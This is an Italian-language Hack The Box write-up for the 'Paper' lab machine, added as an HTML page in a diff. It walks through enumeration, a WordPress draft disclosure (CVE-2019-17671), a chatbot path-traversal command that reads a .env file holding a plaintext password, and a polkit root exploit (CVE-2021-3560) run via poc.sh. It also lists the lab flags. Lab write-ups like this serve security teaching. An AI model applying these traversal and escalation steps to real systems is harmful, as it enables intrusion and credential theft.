@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<head>
+  <title> HTB - Paper </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="generator" content="Org-mode">
+  <meta name="author" content="Leonardo Tamiano">
+
+  <link rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+    integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+    crossorigin="anonymous"/>
+
+  <link rel="stylesheet"
+    href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@5.2/distr/fira_code.css"/>
+
+  <style>
+    body {
+	font-family: 'Fira Code', monospace;
+	font-size: 20px;
+	background-color: #21202C;
+	color: white;
+    }
+
+    h1, h2, h3, h4 {
+	color: #EE72F1;
+	font-weight: bold;
+    }
+
+    .container {
+	margin: auto;
+	width: 70%;
+    }
+
+    .container div#title-div {
+	margin-top: 50px;
+	text-align: center;
+    }
+
+    .container .outline-section {
+	margin-top: 30px;
+	margin-bottom: 30px;
+    }
+
+    footer ul {
+	list-style: none;
+	text-align: center;
+    }
+   </style>
+
+  <script type="text/x-mathjax-config">
+     MathJax.Hub.Config({
+       displayAlign: "center",
+       displayIndent: "2em",
+       messageStyle: "none",
+       "HTML-CSS": {
+          scale: 100,
+          styles: {
+            ".MathJax_Display": {
+            "font-size": "100%"
+          }
+       }
+     },
+     "SVG": {
+       scale: 100,
+       styles: {
+          ".MathJax_SVG_Display": {
+          "font-size": "100%",
+          "margin-left": "-2.281em"
+          }
+       }
+      }
+    });
+  </script>
+  <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_SVG"></script>
+</head>
+<body>
+  <div class="container">
+    <div id="title-div">
+       <h1>HTB - Paper</h1>
+    </div>    <hr/>
+<div id="outline-container-sec-1" class="outline-section">
+<h2> 1 Enumeration </h2>
+<div id="outline-container-sec-1-1" class="outline-section">
+<h3> 1.1 nmap </h3>
+<div id="outline-container-sec-1-1-1" class="outline-section">
+<h4> 1.1.1 nmap -sC -sV paper </h4>
+<pre class="example">
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-16 22:26 CET
+Nmap scan report for paper (10.129.142.177)
+Host is up (0.079s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-title: HTTP Server Test Page powered by CentOS
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: HTTP Server Test Page powered by CentOS
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2021-07-03T08:52:34
+|_Not valid after:  2022-07-08T10:32:34
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+| tls-alpn: 
+|_  http/1.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.83 seconds
+
+</pre>
+</div>
+<div id="outline-container-sec-1-1-2" class="outline-section">
+<h4> 1.1.2 nmap -p- paper </h4>
+<pre class="example">
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-16 22:26 CET
+Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 33.90% done; ETC: 22:27 (0:00:51 remaining)
+Nmap scan report for paper (10.129.142.177)
+Host is up (0.054s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 72.17 seconds
+
+</pre>
+</div>
+</div>
+
+<div id="outline-container-sec-1-2" class="outline-section">
+<h3> 1.2 gobuster </h3>
+<div id="outline-container-sec-1-2-1" class="outline-section">
+<h4> 1.2.1 leo@kali:~/repos/htb/machines/paper$ gobuster vhost -u office.paper -w ~/repos/SecLists/Discovery/DNS/subdomains-top1million-110000.txt </h4>
+<pre class="example">
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://office.paper
+[+] Method:       GET
+[+] Threads:      10
+[+] Wordlist:     /home/leo/repos/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2022/02/16 23:22:24 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: chat.office.paper (Status: 200) [Size: 223163]
+Progress: 8623 / 114442 (7.53%)    
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-3" class="outline-section">
+<h3> 1.3 www </h3>
+<div id="outline-container-sec-1-3-1" class="outline-section">
+<h4> 1.3.1 X-Backend-Server </h4>
+<p>
+Se inviamo la seguente richiesta all'endpoint <code>/</code> di paper
+</p>
+
+<pre class="example">
+GET / HTTP/1.1
+Host: paper
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+</pre>
+
+<p>
+otteniamo la seguente risposta
+</p>
+
+<pre class="example">
+HTTP/1.1 403 Forbidden
+Date: Wed, 16 Feb 2022 22:10:50 GMT
+Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+X-Backend-Server: office.paper
+Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
+ETag: "30c0b-5c5c7fdeec240"
+Accept-Ranges: bytes
+Content-Length: 199691
+Connection: close
+Content-Type: text/html; charset=UTF-8    
+</pre>
+
+<p>
+Notiamo il parametro <code>X-Backend-Server</code> questo parametro è
+utilizzato per ritornare il nome del server backend che si trova
+dietro ad un balance server, ad esempio <code>nginx</code>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-sec-1-4" class="outline-section">
+<h3> 1.4 office.paper (wordpress 5.2.3) </h3>
+<div id="outline-container-sec-1-4-1" class="outline-section">
+<h4> 1.4.1 users </h4>
+<p>
+prisonmike
+</p>
+</div>
+
+<div id="outline-container-sec-1-4-2" class="outline-section">
+<h4> 1.4.2 <a href="http://office.paper/index.php/2021/06/19/feeling-alone/">http://office.paper/index.php/2021/06/19/feeling-alone/</a> </h4>
+<pre class="example">
+     Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
+-Nick
+</pre>
+</div>
+
+<div id="outline-container-sec-1-4-3" class="outline-section">
+<h4> 1.4.3 CVE-2019-17671 </h4>
+<p>
+<a href="https://www.acunetix.com/vulnerabilities/web/wordpress-5-2-x-multiple-vulnerabilities-5-2-5-2-3/">https://www.acunetix.com/vulnerabilities/web/wordpress-5-2-x-multiple-vulnerabilities-5-2-5-2-3/</a>
+<a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/</a>
+</p>
+
+<div id="outline-container-sec-1-4-3-1" class="outline-section">
+<h5> 1.4.3.1 <a href="http://office.paper/?static=1">http://office.paper/?static=1</a> </h5>
+<pre class="example">
+test
+
+Micheal please remove the secret from drafts for gods sake!
+
+Hello employees of Blunder Tiffin,
+
+Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.
+
+So, I kindly request you all to take your discussions from the public blog to a more private chat system.
+
+-Nick
+
+# Warning for Michael
+
+Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick
+
+Threat Level Midnight
+
+A MOTION PICTURE SCREENPLAY,
+WRITTEN AND DIRECTED BY
+MICHAEL SCOTT
+
+[INT:DAY]
+
+Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….
+
+# Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+
+# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
+
+# Also, stop looking at my drafts. Jeez!     
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-sec-1-5" class="outline-section">
+<h3> 1.5 rocket.chat </h3>
+<p>
+Tramite il link di registrazione preso da wordpress siamo in grado
+di regitrarci.
+</p>
+
+<pre class="example">
+   http://chat.office.paper/register/8qozr226AhkCHZdyY
+</pre>
+
+<p>
+<a href="http://chat.office.paper/home">http://chat.office.paper/home</a>
+</p>
+
+<div id="outline-container-sec-1-5-1" class="outline-section">
+<h4> 1.5.1 recycplos </h4>
+<p>
+recyclops file sale/portfolio
+recyclops list ..
+</p>
+</div>
+
+<div id="outline-container-sec-1-5-2" class="outline-section">
+<h4> 1.5.2 <a href="http://chat.office.paper/home">http://chat.office.paper/home</a> </h4>
+</div>
+<div id="outline-container-sec-1-5-3" class="outline-section">
+<h4> 1.5.3 <a href="http://chat.office.paper/api/info">http://chat.office.paper/api/info</a> </h4>
+<pre class="example">
+{"version":"3.16.1","success":true}    
+</pre>
+</div>
+
+<div id="outline-container-sec-1-5-4" class="outline-section">
+<h4> 1.5.4 <a href="http://chat.office.paper/scripts.js">http://chat.office.paper/scripts.js</a> </h4>
+<div class="org-src-container">
+
+<pre class="src src-js">window.USE_REST_FOR_DDP_CALLS = <span style="color: #a45bad;">true</span>;
+
+
+<span style="color: #2aa1ae; background-color: #292e34;">// </span><span style="color: #2aa1ae; background-color: #292e34;">Custom_Script_Logged_Out</span>
+window.addEventListener(<span style="color: #2d9574;">'Custom_Script_Logged_Out'</span>, <span style="color: #4f97d7; font-weight: bold;">function</span>() {
+        <span style="color: #2aa1ae; background-color: #292e34;">//</span><span style="color: #2aa1ae; background-color: #292e34;">Add your script</span>
+})
+
+
+<span style="color: #2aa1ae; background-color: #292e34;">// </span><span style="color: #2aa1ae; background-color: #292e34;">Custom_Script_Logged_In</span>
+window.addEventListener(<span style="color: #2d9574;">'Custom_Script_Logged_In'</span>, <span style="color: #4f97d7; font-weight: bold;">function</span>() {
+        <span style="color: #4f97d7; font-weight: bold;">function</span> <span style="color: #bc6ec5; font-weight: bold;">getCookie</span>(<span style="color: #7590db;">name</span>) {
+  <span style="color: #4f97d7; font-weight: bold;">const</span> <span style="color: #7590db;">value</span> = <span style="color: #2d9574;">`; ${document.cookie}`</span>;
+  <span style="color: #4f97d7; font-weight: bold;">const</span> <span style="color: #7590db;">parts</span> = value.split(<span style="color: #2d9574;">`; ${name}=`</span>);
+  <span style="color: #4f97d7; font-weight: bold;">if</span> (parts.length === 2) <span style="color: #4f97d7; font-weight: bold;">return</span> parts.pop().split(<span style="color: #2d9574;">';'</span>).shift();
+}
+<span style="color: #4f97d7; font-weight: bold;">var</span> <span style="color: #7590db;">xhttp</span> = <span style="color: #4f97d7; font-weight: bold;">new</span> <span style="color: #ce537a; font-weight: bold;">XMLHttpRequest</span>();
+<span style="color: #4f97d7; font-weight: bold;">var</span> <span style="color: #7590db;">token</span> = getCookie(<span style="color: #2d9574;">"rc_token"</span>);
+<span style="color: #4f97d7; font-weight: bold;">var</span> <span style="color: #7590db;">uid</span> = getCookie(<span style="color: #2d9574;">"rc_uid"</span>);
+
+
+<span style="color: #4f97d7; font-weight: bold;">if</span>(uid===<span style="color: #2d9574;">"WoxmTzWbvoijWkN5X"</span>){
+xhttp.open(<span style="color: #2d9574;">"POST"</span>, <span style="color: #2d9574;">"/api/v1/logout"</span>, <span style="color: #a45bad;">true</span>);
+xhttp.setRequestHeader(<span style="color: #2d9574;">"X-Auth-Token"</span>, token);
+xhttp.setRequestHeader(<span style="color: #2d9574;">"X-User-Id"</span>, uid);
+xhttp.send();
+alert(<span style="color: #2d9574;">"Nice Try Skynet! Bots are not allowed to login via Web Console!"</span>);
+}
+<span style="color: #4f97d7; font-weight: bold;">else</span>{
+console.log(<span style="color: #2d9574;">"Normal Login."</span>);
+}
+})
+
+
+<span style="color: #2aa1ae; background-color: #292e34;">// </span><span style="color: #2aa1ae; background-color: #292e34;">Custom_Script_On_Logout</span>
+window.addEventListener(<span style="color: #2d9574;">'Custom_Script_On_Logout'</span>, <span style="color: #4f97d7; font-weight: bold;">function</span>() {
+        <span style="color: #2aa1ae; background-color: #292e34;">//</span><span style="color: #2aa1ae; background-color: #292e34;">Add your script</span>
+})    
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-5-5" class="outline-section">
+<h4> 1.5.5 bot_restart.sh </h4>
+<div class="org-src-container">
+
+<pre class="src src-sh"><span style="color: #2aa1ae; background-color: #292e34;">#</span><span style="color: #2aa1ae; background-color: #292e34;">!/bin/</span><span style="color: #4f97d7; font-weight: bold;">bash</span>
+
+<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Cleaning hubot's log so that it won't grow too large.</span>
+<span style="color: #4f97d7;">echo</span> <span style="color: #2d9574;">""</span> &gt; /home/dwight/hubot/.hubot.log
+
+
+<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">For starting the bot 20-ish (10+20) seconds late, when the server is restarted.</span>
+<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">This is because MongoDB and Rocket-Chat server needs some time to startup properly</span>
+sleep 10s
+
+<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Checks if Hubot is running every 10s</span>
+<span style="color: #4f97d7; font-weight: bold;">while</span> [ 1 ];
+<span style="color: #4f97d7; font-weight: bold;">do</span>
+sleep 20s
+<span style="color: #7590db;">alive</span>=$(<span style="color: #bc6ec5;">/usr/sbin/ss -tulnp|grep 8000</span>);
+<span style="color: #4f97d7; font-weight: bold;">if</span> [[ -n $<span style="color: #7590db;">alive</span> ]]; <span style="color: #4f97d7; font-weight: bold;">then</span>
+<span style="color: #7590db;">err</span>=$(<span style="color: #bc6ec5;">grep -i 'unhandled-rejections=strict' /home/dwight/hubot/.hubot.log</span>)
+<span style="color: #4f97d7; font-weight: bold;">if</span> [[ -n $<span style="color: #7590db;">err</span> ]]; <span style="color: #4f97d7; font-weight: bold;">then</span>
+<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Restarts bot</span>
+<span style="color: #4f97d7;">echo</span> <span style="color: #2d9574;">"[-] Bot not running! date"</span>;
+<span style="color: #2aa1ae; background-color: #292e34;">#</span><span style="color: #2aa1ae; background-color: #292e34;">Killing the old process</span>
+<span style="color: #7590db;">pid</span>=$(<span style="color: #bc6ec5;">ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d " " -f6</span>);
+<span style="color: #4f97d7;">kill</span> -9 $<span style="color: #7590db;">pid</span>;
+<span style="color: #4f97d7;">cd</span> /home/dwight/hubot;
+<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Cleaning hubot's log so that it won't grow too large.</span>
+<span style="color: #4f97d7;">echo</span> <span style="color: #2d9574;">""</span> &gt; /home/dwight/hubot/.hubot.log
+bash /home/dwight/hubot/start_bot.sh&amp;
+<span style="color: #4f97d7; font-weight: bold;">else</span>
+
+
+<span style="color: #4f97d7;">echo</span> <span style="color: #2d9574;">"[+] Bot running succesfully! date"</span>;
+<span style="color: #4f97d7; font-weight: bold;">fi</span>
+
+<span style="color: #4f97d7; font-weight: bold;">else</span>
+<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Restarts bot</span>
+<span style="color: #4f97d7;">echo</span> <span style="color: #2d9574;">"[-] Bot not running! date"</span>;
+<span style="color: #2aa1ae; background-color: #292e34;">#</span><span style="color: #2aa1ae; background-color: #292e34;">Killing the old process</span>
+<span style="color: #7590db;">pid</span>=$(<span style="color: #bc6ec5;">ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d " " -f6</span>);
+<span style="color: #4f97d7;">kill</span> -9 $<span style="color: #7590db;">pid</span>;
+<span style="color: #4f97d7;">cd</span> /home/dwight/hubot;
+bash /home/dwight/hubot/start_bot.sh&amp;
+<span style="color: #4f97d7; font-weight: bold;">fi</span>
+
+<span style="color: #4f97d7; font-weight: bold;">done</span>    
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-5-6" class="outline-section">
+<h4> 1.5.6 recyclops file ../hubot/.env </h4>
+<pre class="example">
+recyclops
+Bot
+11:46 PM
+&lt;!=====Contents of file ../hubot/.env=====&gt;
+&lt;!=====Contents of file ../hubot/.env=====&gt;
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1
+&lt;!=====End of file ../hubot/.env=====&gt;    
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-sec-2" class="outline-section">
+<h2> 2 PrivEsc </h2>
+<p>
+A quanto pare è vulnerabile il sotto-sistema polkit alla CVE:
+<code>CVE-2021-3560</code>.
+</p>
+
+<div id="outline-container-sec-2-1" class="outline-section">
+<h3> 2.1 <a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/</a> </h3>
+<p>
+<a href="https://github.com/hakivvi/CVE-2021-3560">https://github.com/hakivvi/CVE-2021-3560</a>
+</p>
+<pre class="example">
+   sudo apt install build-essential libdbus-glib-1-dev libgirepository1.0-dev
+</pre>
+
+<p>
+<a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/</a>
+Quello che ha funzionato è lo script in bash .sh che l'ho
+utilizzato come segue
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">[dwight@paper ~]$ ./poc.sh  -u=prova -p=password   
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-sec-3" class="outline-section">
+<h2> 3 Summary </h2>
+<p>
+<span class="timestamp-wrapper"><span class="timestamp">[2022-03-07 lun 00:22]</span></span>
+</p>
+
+<p>
+Riassunto della macchina per video
+</p>
+
+<pre class="example">
+nmap
+X-backend-server 
+office.paper wordpress (5.2.3) 
+CVE-2019-17671 per leggere posts con /?static=1
+registrazione a rocket.chat
+parlare con bot "recyclops file ../hubot/.env"
+entrare come dwight
+CVE-2021-3560 su polkit per ottenere root tramite poc.sh  
+</pre>
+</div>
+
+<div id="outline-container-sec-4" class="outline-section">
+<h2> 4 Flags </h2>
+<ul class="org-ul">
+<li><p>
+<b>user</b>: 73ab51c6fbac0d02ab2f0d6141a4180f
+</p>
+</li>
+<li><p>
+<b>root</b>: dd131ebcb4d6d7791649d549ba930423
+</p>
+</li>
+</ul>
+</div>
+    <hr/>    <footer>
+      <ul>
+	<li><b>Author</b>: Leonardo Tamiano</li>
+	<li><b>Email</b>: <a href="mailto:leo@archlinux">leo@archlinux</a></li>
+	<li><b>Created</b>: 2022-05-10 mar 09:51</li>
+      </ul>
+</footer>
+</div>
+</body>
+</html>
